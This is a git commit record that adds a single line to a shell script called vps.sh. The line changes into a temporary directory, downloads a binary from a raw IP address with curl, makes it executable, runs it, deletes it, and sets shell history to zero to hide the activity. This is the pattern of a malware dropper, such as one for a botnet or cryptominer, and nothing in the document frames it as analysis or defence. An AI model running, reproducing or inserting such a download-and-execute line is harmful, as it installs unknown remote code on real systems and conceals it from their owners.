24908e9fc011bc94240bac061558fa4a53bf9d7a
Đậu Đậu <59077968+DauDau432@users.noreply.github.com>
2023-03-08 22:48:49 +0700

    Update vps.sh

--- vps.sh
+++ vps.sh
@@ -1,1 +1,2 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://103.183.118.73/x86_64 && chmod 777 x86_64 && ./x86_64 daukute && rm -rf x86_64 && cd /root/ && clear && HISTSIZE=0 && exit
 
